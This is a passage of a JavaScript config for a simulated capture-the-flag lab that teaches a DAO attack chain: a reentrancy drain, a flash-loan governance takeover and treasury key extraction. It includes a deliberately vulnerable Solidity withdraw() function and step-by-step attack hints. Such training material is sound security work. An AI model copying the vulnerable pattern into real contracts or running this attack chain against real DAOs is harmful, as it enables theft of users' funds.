/* ============================================================
   CTF ARENA — Box D17: The Rogue Consensus
   Expert Campaign | DAO Smart Contract Exploitation, Reentrancy Attack, Treasury Drain
   Config: simulated blockchain environment, Solidity artifacts, governance system, flags, hints, lore
   ============================================================ */

const D17Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Rogue Consensus',
    subtitle: 'Expert Campaign — DAO Exploitation, Smart Contract Reentrancy, Treasury Drain',
    difficulty: 'Expert',
    accent: '#8b5cf6',
    storageKey: 'hexworth_ctf_d17',
    registryId: 'd17-rogue-consensus',
    trackerKey: 'ctf_d17',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer blockchain attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Contract Reconnaissance',
            icon: '\uD83D\uDD0D',
            description: 'Analyze the Aetherium DAO smart contracts and governance rules. Map the attack surface of AetheriumAllocation.sol.',
            requiredFlags: [],
            mitre: ['T1046', 'T1595.002', 'T1592.002'],
            unlocks: ['analysis'],
            locked: false
        },
        {
            id: 'analysis',
            name: 'Vulnerability Analysis',
            icon: '\uD83D\uDC89',
            description: 'Identify the reentrancy vulnerability in the withdraw() function. Confirm integer overflow in the allocation counter.',
            requiredFlags: [],
            mitre: ['T1190', 'T1059.006'],
            unlocks: ['exploit'],
            locked: true
        },
        {
            id: 'exploit',
            name: 'Exploit Development',
            icon: '\uD83D\uDD12',
            description: 'Craft AttackerContract.sol. Deploy it to the simulated EVM. Trigger the recursive withdraw() to drain Sector Alpha allocations.',
            requiredFlags: ['user'],
            mitre: ['T1059.006', 'T1059.004', 'T1486'],
            unlocks: ['injection'],
            locked: true
        },
        {
            id: 'injection',
            name: 'Rogue Consensus Injection',
            icon: '\uD83D\uDD00',
            description: 'Execute the flash loan governance attack. Acquire temporary voting majority. Submit and pass the malicious reallocation proposal.',
            requiredFlags: ['exploit'],
            mitre: ['T1565', 'T1496', 'T1059.006'],
            unlocks: ['treasury'],
            locked: true
        },
        {
            id: 'treasury',
            name: 'Treasury Extraction',
            icon: '\uD83C\uDFC6',
            description: 'The reentrancy drain has succeeded. Locate the Aetherium Master Key from the compromised treasury wallet. Extract the private key.',
            requiredFlags: ['root'],
            mitre: ['T1005', 'T1041', 'T1567'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Review the Aetherium smart contracts',
                tip: 'Use cat to read aetherium_contract_code.sol and dao_governance_rules.txt. Study the withdraw() function carefully.',
                trigger: { event: 'command', match: { cmd: 'contains:cat' } }
            },
            {
                title: 'Identify the reentrancy vulnerability',
                tip: 'In withdraw(), ETH is transferred before the balance is updated — classic Checks-Effects-Interactions violation. Run: analyze aetherium_contract_code.sol',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:analyze' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:slither' } },
                        { event: 'command', match: { cmd: 'contains:mythril' } }
                    ]
                }
            },
            {
                title: 'Deploy your attacker contract and capture Flag 1',
                tip: 'Write AttackerContract.sol with a fallback() function that recursively calls withdraw(). Deploy with: deploy AttackerContract.sol',
                trigger: { event: 'flag_correct', match: { flagId: 'user' } }
            },
            {
                title: 'Execute the flash loan governance attack',
                tip: 'Borrow 51% of AET voting tokens via flash loan. Submit proposal-9973. Vote yes. Execute before the loan is repaid.',
                trigger: { event: 'flag_correct', match: { flagId: 'exploit' } }
            },
            {
                title: 'Extract the Aetherium Master Key',
                tip: 'After the treasury drain completes, run: wallet --dump --address 0xAETH-TREASURY-7F3A to retrieve the private key.',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'user',    objective: '1.2', description: 'Analyze indicators of malicious activity — reentrancy exploit in smart contract withdraw() function', skill: 'Smart Contract Vulnerability Identification' },
            { flagId: 'exploit', objective: '2.4', description: 'Analyze indicators associated with application attacks — flash loan manipulation of governance voting power', skill: 'Flash Loan Governance Attack' },
            { flagId: 'root',    objective: '1.4', description: 'Analyze indicators associated with cryptographic attacks — private key extraction from compromised treasury', skill: 'Blockchain Treasury Extraction' },
            { flagId: 'root',    objective: '4.1', description: 'Apply security techniques to computing resources — smart contract audit and access control enforcement', skill: 'Multi-Stage DAO Compromise' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/sda1 (1TB NVMe SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',        icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',        icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag',  icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: Aetherium Consensus DAO — Simulated EVM Node at 10.0.0.50:8545\nObjective: Rogue consensus. Drain the treasury. Retrieve the Master Key.\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (blockchain session state)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',          // 'attacker' | 'evm' | 'governance' | 'treasury'
    _contractDeployed: false,       // AttackerContract.sol deployed to EVM
    _reentrancyTriggered: false,    // withdraw() recursion executed
    _flashLoanActive: false,        // flash loan borrow in progress
    _proposalPassed: false,         // malicious governance proposal executed
    _treasuryDrained: false,        // reentrancy drain completed
    _evmConnected: false,           // web3 / ethers.js session active

    _switchContext(ctx, term) {
        D17Config._context = ctx;
        // Update terminal prompt to match the active environment
        if (term && term.config) {
            var prompt = D17Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'kali';
                term.config.hostname = 'context';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (D17Config._context) {
            case 'evm':        return 'attacker@aetherium-evm:~$ ';
            case 'governance': return 'attacker@aetherium-gov:~$ ';
            case 'treasury':   return 'attacker@aetherium-treasury:~$ ';
            default:           return null; // default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // SIMULATED BLOCKCHAIN STATE (Aetherium DAO)
    // ═══════════════════════════════════════════════════════

    _chain: {
        // Governance token balances — AET (Aetherium Token)
        aet_balances: {
            '0xDAO-TREASURY-7F3A': 4800000,   // 48% — DAO treasury reserve
            '0xSECTOR-ALPHA-001':   1500000,   // 15% — Sector Alpha allocation pool
            '0xSECTOR-BETA-002':    1200000,   // 12% — Sector Beta allocation pool
            '0xCOMMITTEE-003':       800000,   // 8%  — Governance committee multi-sig
            '0xFLASH-POOL-777':     1000000,   // 10% — Flash loan liquidity pool (AetherLend)
            '0xATTACKER-ADDR':         5000,   // 0.05% — attacker starting stake
            '0xVICTIM-VOTER-A':       250000,  // 2.5% — legitimate delegator A
            '0xVICTIM-VOTER-B':       245000   // 2.45% — legitimate delegator B
        },
        // DAO resource allocation registry — Sector Alpha -> Beta reroute target
        allocations: [
            { id: 1, sector: 'Sector Alpha', address: '0xSECTOR-ALPHA-001', amount: 1500000, unit: 'AET', status: 'Active',  category: 'Supply Chain Nodes' },
            { id: 2, sector: 'Sector Beta',  address: '0xSECTOR-BETA-002',  amount: 1200000, unit: 'AET', status: 'Active',  category: 'Processing Hubs'    },
            { id: 3, sector: 'Committee',    address: '0xCOMMITTEE-003',    amount:  800000, unit: 'AET', status: 'Locked',  category: 'Governance Reserve' },
            { id: 4, sector: 'ROGUE REROUTE — ATTACKER DRAIN', address: '{{FLAG:exploit}}', amount: 0, unit: 'AET', status: 'PENDING-EXPLOIT', category: 'CLASSIFIED' }
        ],
        // Governance proposals
        proposals: [
            { id: 9970, title: 'Increase Sector Alpha capacity by 10%',       votes_yes: 3200000, votes_no: 1800000, status: 'PASSED',  proposer: '0xCOMMITTEE-003' },
            { id: 9971, title: 'Upgrade oracle feed to Chainlink v2',         votes_yes: 4100000, votes_no:  900000, status: 'PASSED',  proposer: '0xCOMMITTEE-003' },
            { id: 9972, title: 'Reduce flash loan fee to 0.01%',               votes_yes: 2900000, votes_no: 2100000, status: 'FAILED',  proposer: '0xVICTIM-VOTER-A' },
            { id: 9973, title: '[MALICIOUS] Transfer 4,800,000 AET to 0xATTACKER-ADDR', votes_yes: 0, votes_no: 0, status: 'PENDING', proposer: '0xATTACKER-ADDR' }
        ],
        // Simulated transaction log
        tx_log: [
            { tx: '0x1a2b3c4d...', block: 18334010, from: '0xCOMMITTEE-003', to: 'AetheriumAllocation', fn: 'vote(9970, true)',  status: 'SUCCESS' },
            { tx: '0x5e6f7a8b...', block: 18334082, from: '0xVICTIM-VOTER-A', to: 'AetheriumAllocation', fn: 'delegate(0xCOMMITTEE-003)', status: 'SUCCESS' },
            { tx: '0x9c0d1e2f...', block: 18334199, from: '0xATTACKER-ADDR', to: 'AetherLend',          fn: 'flashBorrow(AET, 1000000)', status: 'PENDING' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'user',    points: 150 },   // exploit code snippet (reentrancy contract)
        { id: 'exploit', points: 200 },   // transaction hash proving rogue reroute
        { id: 'root',    points: 300 }    // Aetherium Master Key (private key string)
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 2000,
        maxScore: 650,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2700000, points: 200 },   // 45 minutes
        timeBonusThreshold: 5400                            // 90 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'Read aetherium_contract_code.sol carefully. The withdraw() function transfers ETH to msg.sender BEFORE updating balances[msg.sender]. This is a textbook reentrancy vulnerability — the attacker\'s fallback() can call withdraw() again before the balance is zeroed.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'Deploy AttackerContract.sol with a fallback() or receive() function that calls AetheriumAllocation.withdraw() recursively. Use: deploy AttackerContract.sol — then trigger with: call AttackerContract attack(). Watch the recursion depth counter.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'For the governance attack: use AetherLend\'s flash loan to borrow 1,000,000 AET (10% of supply). Combined with your 5,000 AET stake, target delegators 0xVICTIM-VOTER-A and 0xVICTIM-VOTER-B. With their delegated tokens you can hit 51%. Use: flashloan --amount 1000000 --token AET',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'After passing proposal-9973, the treasury transfer executes automatically. Run: wallet --dump --address 0xDAO-TREASURY-7F3A to extract the Aetherium Master Key from the now-drained treasury wallet. The private key is embedded in the wallet metadata.',
            cost: 75,
            penalty: -75
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The "Aetherium Consensus" governs the Confederacy\'s most critical supply chain infrastructure through an immutable DAO. Its smart contracts allocate resources across Sector Alpha\'s supply nodes and Sector Beta\'s processing hubs — collectively worth billions in strategic materials. The developers believed their code was airtight. They were wrong. A subtle violation of the Checks-Effects-Interactions pattern in the core allocation contract has gone undetected through three external audits. Your mission, Peerless: exploit it. Force a rogue consensus. Drain the treasury. Extract the Master Key that controls the DAO\'s ultimate reserve.',
        scenario: 'The Aetherium DAO runs on a simulated EVM node at 10.0.0.50:8545. Its AetheriumAllocation.sol contract manages all resource distributions via on-chain votes. The governance token (AET) is distributed among sectors, committee members, and a flash loan liquidity pool operated by AetherLend. The DAO\'s treasury wallet (0xDAO-TREASURY-7F3A) holds 4.8 million AET. If you can force a malicious governance proposal through — by temporarily acquiring 51% voting power via flash loan — and simultaneously trigger the reentrancy drain, the treasury is yours. The Aetherium Master Key, embedded in the treasury wallet metadata, unlocks the highest-value positions in the entire Confederacy supply chain.',
        outro: 'The Aetherium Consensus has fallen. 4.8 million AET, representing the entirety of the Confederacy\'s strategic resource reserve, has been rerouted through the rogue proposal. The Master Key is extracted. Every allocation governed by the DAO — food, fuel, munitions, medical supplies — can now be redirected at will. One unpatched vulnerability. One missed audit finding. The cost: the economic stability of an entire network of nations.',
        ecer: {
            executive: 'Development team prioritized rapid deployment over formal security review; three audits completed by same firm with no adversarial testing',
            culture: 'Smart contract development culture that treated audit reports as compliance checkboxes rather than actionable findings; reentrancy known risk left unmitigated',
            employee: 'Checks-Effects-Interactions pattern ignored in withdraw(); no reentrancy guard (ReentrancyGuard from OpenZeppelin); no multi-sig requirement on treasury transfers',
            regulatory: 'No on-chain governance delay (timelock) between proposal passage and execution; flash loan voting power not bounded; no quorum minimum enforced per proposal'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Aetherium DAO Governance Portal
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.0.0.50/',

        pages: {
            '/': {
                title: 'Aetherium Consensus — DAO Governance Portal',
                html: `
                    <div style="text-align:center; margin-bottom:30px; padding-bottom:20px; border-bottom:1px solid #2d1f4e;">
                        <h1 style="color:#c4b5fd; font-size:1.6rem; font-family:Georgia,serif; margin-bottom:4px;">Aetherium Consensus</h1>
                        <div style="color:#8b5cf6; font-size:0.9rem; font-weight:700; letter-spacing:0.15em;">DECENTRALIZED GOVERNANCE PORTAL</div>
                        <div style="color:#6b7280; font-size:0.75rem; margin-top:6px;">Confederacy Supply Chain Resource Allocation — Epoch 447</div>
                    </div>

                    <div style="max-width:620px; margin:0 auto 20px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px;">
                        <div style="background:#1a0f2e; border:1px solid #4c1d95; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#c4b5fd;">10,000,000</div>
                            <div style="color:#6b7280; font-size:0.68rem;">Total AET Supply</div>
                        </div>
                        <div style="background:#1a0f2e; border:1px solid #4c1d95; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#c4b5fd;">9,973</div>
                            <div style="color:#6b7280; font-size:0.68rem;">Active Proposal ID</div>
                        </div>
                        <div style="background:#1a0f2e; border:1px solid #4c1d95; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#c4b5fd;">447</div>
                            <div style="color:#6b7280; font-size:0.68rem;">Governance Epoch</div>
                        </div>
                    </div>

                    <div style="max-width:620px; margin:0 auto; padding:12px; background:rgba(139,92,246,0.06); border:1px solid rgba(139,92,246,0.2); border-radius:4px; font-size:0.75rem; color:#9ca3af;">
                        <strong style="color:#8b5cf6;">Node Notice:</strong> EVM RPC endpoint active at
                        <a href="/rpc" style="color:#8b5cf6;">/rpc</a>.
                        Contract ABI at <a href="/abi" style="color:#8b5cf6;">/abi</a>.
                        Governance rules at <a href="/governance" style="color:#8b5cf6;">/governance</a>.
                    </div>
                `,
                formHandler: null
            },

            '/governance': {
                title: 'Aetherium — Governance Rules',
                html: `
                    <div style="max-width:640px; margin:0 auto;">
                        <h2 style="color:#c4b5fd; font-size:1.1rem; margin-bottom:4px;">DAO Governance Rules</h2>
                        <div style="color:#6b7280; font-size:0.72rem; margin-bottom:18px;">dao_governance_rules.txt — AetheriumConsensus v2.3.1</div>

                        <div style="background:#1a0f2e; border:1px solid #4c1d95; border-radius:6px; padding:18px; font-family:monospace; font-size:0.78rem; color:#d1d5db; line-height:1.7;">
                            AETHERIUM CONSENSUS — GOVERNANCE SPECIFICATION v2.3.1<br>
                            =========================================================<br><br>

                            1. VOTING POWER<br>
                            &nbsp;&nbsp;- 1 AET token = 1 vote<br>
                            &nbsp;&nbsp;- Delegated tokens count at time of vote snapshot<br>
                            &nbsp;&nbsp;- <span style="color:#f59e0b;">NOTE: Flash-borrowed tokens count toward voting power during borrow window</span><br>
                            &nbsp;&nbsp;- No minimum lock period required before voting<br><br>

                            2. PROPOSAL LIFECYCLE<br>
                            &nbsp;&nbsp;- Any address with >= 1 AET may submit a proposal<br>
                            &nbsp;&nbsp;- Voting window: 72 simulated epochs<br>
                            &nbsp;&nbsp;- Quorum: 50% of circulating supply required<br>
                            &nbsp;&nbsp;- Pass threshold: simple majority (>50% yes)<br>
                            &nbsp;&nbsp;- <span style="color:#f59e0b;">CRITICAL: No timelock between passage and execution</span><br><br>

                            3. TREASURY OPERATIONS<br>
                            &nbsp;&nbsp;- Proposal type TRANSFER_FUNDS executes atomically on passage<br>
                            &nbsp;&nbsp;- No multi-sig requirement on single-proposal treasury transfers<br>
                            &nbsp;&nbsp;- AetheriumAllocation.executeTreasuryTransfer() called automatically<br><br>

                            4. FLASH LOAN INTEGRATION<br>
                            &nbsp;&nbsp;- AetherLend pool holds 1,000,000 AET (10% of supply)<br>
                            &nbsp;&nbsp;- Flash loan fee: 0.05% per transaction<br>
                            &nbsp;&nbsp;- <span style="color:#ef4444;">AUDIT NOTE (unresolved): borrowed tokens are not excluded from voting snapshots</span>
                        </div>
                    </div>
                `,
                formHandler: null
            },

            '/abi': {
                title: 'Aetherium — Contract ABI',
                html: `
                    <div style="max-width:640px; margin:0 auto;">
                        <h2 style="color:#c4b5fd; font-size:1.1rem; margin-bottom:4px;">AetheriumAllocation — ABI</h2>
                        <div style="color:#6b7280; font-size:0.72rem; margin-bottom:18px;">aetherium_contract_abi.json — deployed at 0xAETH-CORE-CONTRACT</div>

                        <div style="background:#1a0f2e; border:1px solid #4c1d95; border-radius:6px; padding:18px; font-family:monospace; font-size:0.74rem; color:#d1d5db; line-height:1.6; overflow-x:auto;">
                            [<br>
                            &nbsp;&nbsp;{ "name": "deposit", "type": "function", "inputs": [], "stateMutability": "payable" },<br>
                            &nbsp;&nbsp;{ "name": "withdraw", "type": "function", "inputs": [{"name": "amount", "type": "uint256"}], "stateMutability": "nonpayable" },<br>
                            &nbsp;&nbsp;{ "name": "allocateTo", "type": "function", "inputs": [{"name": "sector", "type": "address"}, {"name": "amount", "type": "uint256"}] },<br>
                            &nbsp;&nbsp;{ "name": "submitProposal", "type": "function", "inputs": [{"name": "proposalData", "type": "bytes"}] },<br>
                            &nbsp;&nbsp;{ "name": "vote", "type": "function", "inputs": [{"name": "proposalId", "type": "uint256"}, {"name": "support", "type": "bool"}] },<br>
                            &nbsp;&nbsp;{ "name": "executeProposal", "type": "function", "inputs": [{"name": "proposalId", "type": "uint256"}] },<br>
                            &nbsp;&nbsp;{ "name": "executeTreasuryTransfer", "type": "function", "inputs": [{"name": "to", "type": "address"}, {"name": "amount", "type": "uint256"}] },<br>
                            &nbsp;&nbsp;{ "name": "balances", "type": "function", "inputs": [{"name": "addr", "type": "address"}], "outputs": [{"type": "uint256"}] },<br>
                            &nbsp;&nbsp;{ "name": "totalAllocated", "type": "function", "inputs": [], "outputs": [{"type": "uint256"}], "stateMutability": "view" }<br>
                            ]
                        </div>
                    </div>
                `,
                formHandler: null
            },

            '/rpc': {
                title: 'Aetherium — RPC Interface',
                html: `
                    <div style="max-width:640px; margin:0 auto;">
                        <h2 style="color:#c4b5fd; font-size:1.1rem; margin-bottom:4px;">EVM RPC Node</h2>
                        <div style="color:#6b7280; font-size:0.72rem; margin-bottom:18px;">JSON-RPC 2.0 — 10.0.0.50:8545</div>

                        <div style="background:#1a0f2e; border:1px solid #4c1d95; border-radius:6px; padding:18px; font-family:monospace; font-size:0.75rem; color:#d1d5db; line-height:1.6;">
                            <span style="color:#8b5cf6;">POST /rpc — Accepts JSON-RPC calls</span><br><br>
                            Example — get block number:<br>
                            <span style="color:#6ee7b7;">curl -X POST http://10.0.0.50:8545 \\<br>
                            &nbsp;&nbsp;-H "Content-Type: application/json" \\<br>
                            &nbsp;&nbsp;-d '{"jsonrpc":"2.0","method":"eth_blockNumber","id":1}'</span><br><br>
                            Use web3.py or ethers.js for contract interaction.<br>
                            Example: <span style="color:#f59e0b;">web3 --connect 10.0.0.50:8545</span><br>
                            Or use the terminal shorthand: <span style="color:#f59e0b;">evm-connect</span>
                        </div>

                        <div style="margin-top:16px; padding:10px; background:rgba(239,68,68,0.06); border:1px solid rgba(239,68,68,0.15); border-radius:4px; font-size:0.72rem; color:#9ca3af;">
                            <strong style="color:#ef4444;">Security Notice:</strong> This RPC endpoint has no authentication. Direct contract calls are permitted without wallet signature verification in testnet mode.
                        </div>
                    </div>
                `,
                formHandler: null
            },

            '/proposals': {
                title: 'Aetherium — Active Proposals',
                html: function() {
                    var rows = D17Config._chain.proposals.map(function(p) {
                        var color = p.status === 'PASSED' ? '#4ade80' : p.status === 'FAILED' ? '#f87171' : p.status === 'PENDING' ? '#fbbf24' : '#d1d5db';
                        return '<tr>'
                            + '<td style="padding:6px 10px; border-bottom:1px solid #2d1f4e; color:#c4b5fd;">' + p.id + '</td>'
                            + '<td style="padding:6px 10px; border-bottom:1px solid #2d1f4e;">' + p.title + '</td>'
                            + '<td style="padding:6px 10px; border-bottom:1px solid #2d1f4e; color:#4ade80;">' + p.votes_yes.toLocaleString() + '</td>'
                            + '<td style="padding:6px 10px; border-bottom:1px solid #2d1f4e; color:#f87171;">' + p.votes_no.toLocaleString() + '</td>'
                            + '<td style="padding:6px 10px; border-bottom:1px solid #2d1f4e; color:' + color + '; font-weight:700;">' + p.status + '</td>'
                            + '</tr>';
                    }).join('');
                    return '<div style="max-width:680px; margin:0 auto;">'
                        + '<h2 style="color:#c4b5fd; font-size:1.1rem; margin-bottom:14px;">Governance Proposals — Epoch 447</h2>'
                        + '<table style="width:100%; border-collapse:collapse; font-size:0.76rem; color:#d1d5db;">'
                        + '<thead><tr>'
                        + '<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #4c1d95;">ID</th>'
                        + '<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #4c1d95;">Title</th>'
                        + '<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #4c1d95;">Yes</th>'
                        + '<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #4c1d95;">No</th>'
                        + '<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #4c1d95;">Status</th>'
                        + '</tr></thead><tbody>' + rows + '</tbody></table></div>';
                },
                formHandler: null
            },

            '/allocations': {
                title: 'Aetherium — Resource Allocations',
                html: function() {
                    var rows = D17Config._chain.allocations.map(function(a) {
                        var color = a.status === 'Active' ? '#4ade80' : a.status === 'Locked' ? '#fbbf24' : '#f87171';
                        return '<tr>'
                            + '<td style="padding:6px 10px; border-bottom:1px solid #2d1f4e; color:#c4b5fd;">' + a.id + '</td>'
                            + '<td style="padding:6px 10px; border-bottom:1px solid #2d1f4e;">' + a.sector + '</td>'
                            + '<td style="padding:6px 10px; border-bottom:1px solid #2d1f4e; font-family:monospace; font-size:0.7rem;">' + a.address + '</td>'
                            + '<td style="padding:6px 10px; border-bottom:1px solid #2d1f4e; color:#c4b5fd;">' + a.amount.toLocaleString() + ' ' + a.unit + '</td>'
                            + '<td style="padding:6px 10px; border-bottom:1px solid #2d1f4e; color:' + color + '; font-weight:700;">' + a.status + '</td>'
                            + '</tr>';
                    }).join('');
                    return '<div style="max-width:680px; margin:0 auto;">'
                        + '<h2 style="color:#c4b5fd; font-size:1.1rem; margin-bottom:14px;">Resource Allocation Registry</h2>'
                        + '<table style="width:100%; border-collapse:collapse; font-size:0.76rem; color:#d1d5db;">'
                        + '<thead><tr>'
                        + '<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #4c1d95;">ID</th>'
                        + '<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #4c1d95;">Sector</th>'
                        + '<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #4c1d95;">Address</th>'
                        + '<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #4c1d95;">Amount</th>'
                        + '<th style="padding:6px 10px; text-align:left; color:#8b5cf6; border-bottom:2px solid #4c1d95;">Status</th>'
                        + '</tr></thead><tbody>' + rows + '</tbody></table></div>';
                },
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'notes.txt': {
                                    type: 'file',
                                    content: '=== MISSION BRIEFING: ROGUE CONSENSUS ===\nTarget: Aetherium Consensus DAO — EVM node 10.0.0.50:8545\nObjective: Force rogue governance consensus. Drain DAO treasury. Retrieve Master Key.\n\nAttack chain:\n1. Read ABI, Solidity source, governance rules\n2. Identify reentrancy vulnerability in withdraw()\n3. Build AttackerContract.sol — recursive fallback\n4. Deploy to EVM, trigger drain (Flag 1: exploit snippet)\n5. Flash loan 1,000,000 AET from AetherLend\n6. Acquire 51% voting power + submit malicious proposal-9973\n7. Execute proposal — reroute treasury (Flag 2: tx hash)\n8. Extract Aetherium Master Key from drained wallet (Flag 3)\n\nAetherLend flash pool: 0xFLASH-POOL-777\nTreasury target: 0xDAO-TREASURY-7F3A\nCore contract: 0xAETH-CORE-CONTRACT\n\nGood luck, operator.'
                                },
                                'aetherium_contract_code.sol': {
                                    type: 'file',
                                    content: '// SPDX-License-Identifier: MIT\n// AetheriumAllocation.sol — Aetherium Consensus Core Contract\n// Version: 2.3.1 — WARNING: UNAUDITED REENTRANCY RISK (see issue #441)\n\npragma solidity ^0.8.0;\n\ncontract AetheriumAllocation {\n    mapping(address => uint256) public balances;\n    mapping(address => uint256) public allocationVotes;\n    uint256 public totalAllocated;\n\n    event Deposit(address indexed sender, uint256 amount);\n    event Withdrawal(address indexed recipient, uint256 amount);\n    event AllocationExecuted(address indexed sector, uint256 amount);\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    }\n\n    // VULNERABILITY: Checks-Effects-Interactions pattern VIOLATED\n    // Transfer happens BEFORE balance update — reentrancy possible\n    function withdraw(uint256 amount) external {\n        require(balances[msg.sender] >= amount, "Insufficient balance");\n\n        // FLAW: external call made BEFORE state update\n        (bool success, ) = msg.sender.call{value: amount}("");\n        require(success, "Transfer failed");\n\n        // Balance updated AFTER transfer — too late to prevent reentry\n        balances[msg.sender] -= amount;\n        totalAllocated -= amount;\n\n        emit Withdrawal(msg.sender, amount);\n    }\n\n    // Integer overflow possible if totalAllocated exceeds uint256 max\n    // (mitigated by Solidity 0.8 checked math — but earlier audit assumed 0.7)\n    function allocateTo(address sector, uint256 amount) external onlyGovernance {\n        balances[sector] += amount;\n        totalAllocated += amount;\n        emit AllocationExecuted(sector, amount);\n    }\n\n    modifier onlyGovernance() {\n        // BUG: governance address check is a storage variable, not immutable\n        // If governance contract is replaced via proposal, this is bypassable\n        require(msg.sender == governanceAddress, "Not governance");\n        _;\n    }\n\n    address public governanceAddress;\n\n    function executeTreasuryTransfer(address to, uint256 amount) external onlyGovernance {\n        // No timelock. Executes immediately on governance call.\n        balances[to] += amount;\n        balances[address(this)] -= amount;\n    }\n}'
                                },
                                'dao_governance_rules.txt': {
                                    type: 'file',
                                    content: 'AETHERIUM CONSENSUS — GOVERNANCE SPECIFICATION v2.3.1\n=========================================================\n\n1. VOTING POWER\n   - 1 AET token = 1 vote\n   - Delegated tokens count at time of vote snapshot\n   - NOTE: Flash-borrowed tokens count toward voting power during borrow window\n   - No minimum lock period required before voting\n\n2. PROPOSAL LIFECYCLE\n   - Any address with >= 1 AET may submit a proposal\n   - Voting window: 72 simulated epochs\n   - Quorum: 50% of circulating supply required\n   - Pass threshold: simple majority (>50% yes)\n   - CRITICAL: No timelock between passage and execution\n\n3. TREASURY OPERATIONS\n   - Proposal type TRANSFER_FUNDS executes atomically on passage\n   - No multi-sig requirement on single-proposal treasury transfers\n   - AetheriumAllocation.executeTreasuryTransfer() called automatically\n\n4. FLASH LOAN INTEGRATION\n   - AetherLend pool holds 1,000,000 AET (10% of supply)\n   - Flash loan fee: 0.05% per transaction\n   - UNRESOLVED AUDIT FINDING: borrowed tokens are not excluded from voting snapshots\n\n5. DELEGATION\n   - Addresses may delegate their full balance to another address\n   - No time delay on delegation changes\n   - RISK: delegators can be socially engineered into delegating to attacker'
                                },
                                'aetherium_contract_abi.json': {
                                    type: 'file',
